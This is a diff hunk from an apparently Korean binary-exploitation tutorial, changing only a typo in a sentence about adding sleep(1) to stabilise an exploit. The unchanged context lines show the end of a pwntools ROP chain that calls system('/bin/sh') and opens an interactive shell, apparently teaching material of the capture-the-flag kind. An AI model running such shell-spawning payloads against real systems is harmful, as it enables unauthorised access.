@@ -537,7 +537,7 @@ payload = p64(bss) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
 p.send(payload)
 p.interactive()
 ```
-의도적으로 중간에 출력을 넣지 않는 이상, `sendafter`를 사용할 수 없기 때문에 `sleep(1)`을 추가해 `payload` 실행을 안정화하ㅣ다.
+의도적으로 중간에 출력을 넣지 않는 이상, `sendafter`를 사용할 수 없기 때문에 `sleep(1)`을 추가해 익스 실행을 안정화시킵니다.
 
 ---
 ### Chapter 10
